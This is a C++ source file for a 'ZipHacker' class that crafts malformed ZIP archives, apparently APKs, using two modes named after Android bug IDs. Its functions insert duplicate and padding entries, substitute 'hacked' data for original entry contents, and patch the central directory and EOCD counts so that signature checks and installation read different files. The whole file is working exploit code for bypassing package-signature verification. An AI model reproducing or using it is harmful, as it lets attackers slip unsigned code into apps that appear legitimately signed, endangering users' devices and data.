#include "ziphacker.h"
#include "unzip.h"
#include "zip.h"

#include <QFileInfo>
#include <QDir>
#include <QUuid>
#include "zbytearray.h"
#include "zlog.h"

ZipHacker::ZipHacker()
{
}

ZipHacker::~ZipHacker() {
    while(!entries.isEmpty()) {
        delete entries.takeFirst();
    }
    while(!hackedEntries.isEmpty()) {
        delete hackedEntries.takeFirst();
    }
}

bool ZipHacker::hasExistEntry(const QString &name) {
    foreach(ZipHackerEntry *entry, entries) {
        if(entry->name == name) {
            DBG("duplicate entry '%s'\n", name.toLocal8Bit().data());
            return true;
        }
    }
    return false;
}

bool ZipHacker::readZipFile(const QString &path, bool followbug, bool *hasBug) {
    //DBG("reading zip file '%s' ...\n", TR_C(path));
    if(hasBug != NULL) {
        *hasBug = false;
    }
    while(!entries.isEmpty()) {
        delete entries.takeFirst();
    }

    bool ret = true;
    unzFile file = unzOpen64(TR_C(path), followbug);
    if(file == NULL) {
        DBG("unzOpen fail!\n");
        return false;
    }

    bool entryExists = false;
    unz_global_info global_info;
    unz_file_info file_info;
    char entry[512];
    char buf[4096];
    int n = -1;

    int r = unzGetGlobalInfo(file, &global_info);
    for(uLong i=0; i<global_info.number_entry; i++) {
        if((r = unzGetCurrentFileInfo(file, &file_info, entry, sizeof(entry), NULL, 0, NULL, 0)) != UNZ_OK) {
            DBG("unzGetCurrentFileInfo fail!\n");
            ret = false;
            break;
        }

        //DBG("got entry '%s'\n", entry);
        if((r = unzOpenCurrentFile(file)) != UNZ_OK) {
            DBG("unzOpenCurrentFile %s fail!\n", entry);
            ret = false;
            break;
        }

        entryExists = hasExistEntry(QString(entry));
        if(hasBug != NULL) {
            if(entryExists || unzHasJzipBug(file)) {
                *hasBug = true;
            }
        }

        ZipHackerEntry *zipEntry = new ZipHackerEntry();
        zipEntry->compress_level = Z_DEFAULT_COMPRESSION;
        zipEntry->name = QString::fromUtf8(entry);
        if(entryExists) {
            zipEntry->name += "_jread";
        }

        while((n = unzReadCurrentFile(file, buf, sizeof(buf))) > 0) {
            zipEntry->data.append(buf, n);
        }
        //DBG("entry '%s', size %d\n", entry, zipEntry->data.size());
        unzCloseCurrentFile(file);

        //DBG("got entry '%s', zipLen=%d, unzLen=%d, readLen=%d\n",
        //    entry, file_info.compressed_size, file_info.uncompressed_size,
        //    zipEntry->data.size());
        entries.append(zipEntry);

        if(i < global_info.number_entry - 1) {
            if((r = unzGoToNextFile(file)) != UNZ_OK) {
                break;
            }
        }
    }

    unzClose(file);
    //DBG("read file done.\n");
    return ret;
}

bool ZipHacker::writeZipFile(const QString &path, int hackMode, bool append) {
    if(!append) {
        QFile::remove(path);
    }

    bool ret = true;
    zipFile file = zipOpen64(path.toLocal8Bit().data(), append ? 1: 0);
    if(file == NULL) {
        DBG("zipOpen fail!\n");
        return false;
    }

    zip_fileinfo zi;
    ZipHackerEntry *hack = NULL;
    int r = -1;

    // add padding garbages
    if(hackMode == MODE_9695860) {
        r = entries.count() - hackedEntries.count();
        DBG("entry diff origin %d, hacked %d\n", entries.count(), hackedEntries.count());
        if(r > 0) {
            while(r-- > 0) {
                ZipHackerEntry *pad = new ZipHackerEntry();
                pad->compress_level = Z_DEFAULT_COMPRESSION;
                pad->name = QUuid::createUuid().toString()+"/";
                hackedEntries.append(pad);
            }
        } else if(r < 0) {
            while(r++ < 0) {
                ZipHackerEntry *pad = new ZipHackerEntry();
                pad->compress_level = Z_DEFAULT_COMPRESSION;
                pad->name = "META-INF/"+QUuid::createUuid().toString();
                entries.append(pad);
            }
        }

        ZipHackerEntry *garbage = new ZipHackerEntry();
        garbage->compress_level = Z_DEFAULT_COMPRESSION;
        garbage->name = "META-INF/dximpactor";
        garbage->data.append("hello world");
        entries.insert(0, garbage);
    }

    foreach(ZipHackerEntry *entry, entries) {
        memset(&zi, 0, sizeof(zi));

        if(hackMode == MODE_9950697) {
            hack = NULL;
            foreach(ZipHackerEntry *h, hackedEntries) {
                if(h->name == entry->name) {
                    hack = h;
                    break;
                }
            }
            if(hack != NULL) {
                DBG("hacking entry '%s' using mode %d\n", TR_C(entry->name), hackMode);
                entry->compress_level = 0;
                int padding = entry->data.size() - hack->data.size();
                if(entry->data.size() + strlen(TR_C(entry->name)) > 0xFFFF || padding < 0) {
                    DBG("hacking impossible, abort\n");
                    hack = NULL;
                } else {
                    hack->data.append(QByteArray(padding, '\0'));
                    zi.hack_mode = hackMode;
                    zi.ori_data_ptr = entry->data.data();
                    zi.ori_data_len = entry->data.size();
                    zi.hack_data_ptr = hack->data.data();
                    zi.hack_data_len = hack->data.size();
                    DBG("hacking data padded to %d\n", zi.hack_data_len);
                }
            }
        }

        if((r = zipOpenNewFileInZip3_64(file, TR_C(entry->name), &zi, NULL, 0, NULL, 0, NULL,
                                        entry->compress_level != 0 ? Z_DEFLATED : 0, entry->compress_level, 0,
                                        -MAX_WBITS, DEF_MEM_LEVEL, Z_DEFAULT_STRATEGY,
                                        NULL, 0, 0)) != ZIP_OK) {
            DBG("error when zipOpenNewFileInZip3_64 '%s', %d\n", TR_C(entry->name), r);
            ret = false;
            continue;
        }

        int pos = 0;
        int left = 0;
        char *ptr = NULL;
        if(hack != NULL && hackMode == MODE_9950697) {
            ptr = hack->data.data();
            left = hack->data.size();
        } else {
            ptr = entry->data.data();
            left = entry->data.size();
        }

        //DBG("write entry '%s', size %d\n", TR_C(entry->name), left);
        while(left > 0) {
            int n = left > 4096 ? 4096 : left;
            if((r = zipWriteInFileInZip(file, ptr + pos, n)) < 0) {
                DBG("error when zipWriteInFileInZip '%s'\n", TR_C(entry->name));
                ret = false;
                break;
            }

            pos += n;
            left -= n;
        }

        zipCloseFileInZip(file);
    }

    // add hacked entries
    if(hackMode == MODE_9695860) {
        foreach(ZipHackerEntry *entry, hackedEntries) {
            if((r = zipOpenNewFileInZip3_64(file, TR_C(entry->name), &zi, NULL, 0, NULL, 0, NULL,
                                            entry->compress_level != 0 ? Z_DEFLATED : 0, entry->compress_level, 0,
                                            -MAX_WBITS, DEF_MEM_LEVEL, Z_DEFAULT_STRATEGY,
                                            NULL, 0, 0)) != ZIP_OK) {
                DBG("error when zipOpenNewFileInZip3_64 '%s'\n", TR_C(entry->name));
                ret = false;
                continue;
            }

            int pos = 0;
            int left = entry->data.size();
            char *ptr = entry->data.data();
            //DBG("write hacked entry '%s', size %d\n", TR_C(entry->name), left);
            while(left > 0) {
                int n = left > 4096 ? 4096 : left;
                if((r = zipWriteInFileInZip(file, ptr + pos, n)) < 0) {
                    DBG("error when zipWriteInFileInZip '%s'\n", TR_C(entry->name));
                    ret = false;
                    break;
                }

                pos += n;
                left -= n;
            }

            zipCloseFileInZip(file);
        }
    }
    zipClose(file, NULL);

    // fix central directory headers
    if(hackMode == MODE_9695860 && ret) {
        ret = hackEOCDfor9695860(path);
    }
    return ret;
}

/*
    ... local file header ...
    ... file data ...
    ... local file header ...
    ... file data ...
    ... local file header ...
    ... file data ...
    ...
    ... central directory ... garbage
    ... central directory ... ori1  -endof_garbage
    ... central directory ... ori2
    ... central directory ... ori3
    ...
    ... extra_pad
    ...
    ... central directory ... hack1 -mid_offset
    ... central directory ... hack2
    ... central directory ... hack3
    ... EOCD
  */
bool ZipHacker::hackEOCDfor9695860(const QString &path) {
    QFile f(path);
    ZByteArray key(false);
    ZByteArray data(false);
    bool ret = false;
    int n = 0;

    int eocd_offset;
    int entry_count;
    int cdirs_size;
    int cdirs_offset;

    int endof_garbage;
    int mid_offset;
    int extra_pad;

    do {
        if(!f.open(QIODevice::ReadOnly)) {
            DBG("cannot open file!\n");
            break;
        }
        data.append(f.readAll());
        f.close();

        // find start of EOCD
        key.putInt(0x06054b50);
        if((eocd_offset = data.lastIndexOf(key)) == -1) {
            DBG("cannot locate EOCD!\n");
            break;
        }

        // get eocd values
        n = eocd_offset + 10;
        entry_count = data.getNextShort(n);
        cdirs_size = data.getNextInt(n);
        cdirs_offset = data.getNextInt(n);
        DBG("entry_count = %d\n", entry_count);
        if(entry_count % 2 == 1) {
            // modify entry count
            entry_count = entry_count/2 + 1;
            key.clear();
            key.putShort(entry_count);
            key.putShort(entry_count);
            data.replace(eocd_offset + 8, 4, key);
        } else {
            DBG("invalid entry count!\n");
            break;
        }

        // goto mid_offset
        n = cdirs_offset;
        for(int j=0; j<entry_count; j++) {
            int start = n;
            n += 28;
            u16 nameLen = data.getNextShort(n);
            u16 extraLen = data.getNextShort(n);
            u16 commentLen = data.getNextShort(n);
            n += 12;
            QString name = data.getNextUtf8(n, nameLen);
            n += extraLen;
            n += commentLen;
            if(j ==0) {
                endof_garbage = n;
                // modify extraLen
                key.clear();
                key.putShort(0x8000);
                if(extraLen == 0) {
                    data.replace(start + 30, 2, key);
                } else {
                    DBG("cannot modify extraLen!\n");
                    break;
                }
            }
            //DBG("endof '%s' central directory\n", TR_C(name));
        }
        mid_offset = n;

        // add padding
        extra_pad = 0x8000 - (mid_offset - endof_garbage);
        data.insert(mid_offset, QByteArray(extra_pad, '\0'));
        cdirs_size += extra_pad;
        eocd_offset += extra_pad;

        // modify cdirs_size
        key.clear();
        key.putInt(cdirs_size);
        data.replace(eocd_offset + 12, 4, key);

        f.remove();
        if(f.open(QIODevice::WriteOnly)) {
            f.write(data);
            f.close();
            ret = true;
        }
    } while(0);
    return ret;
}
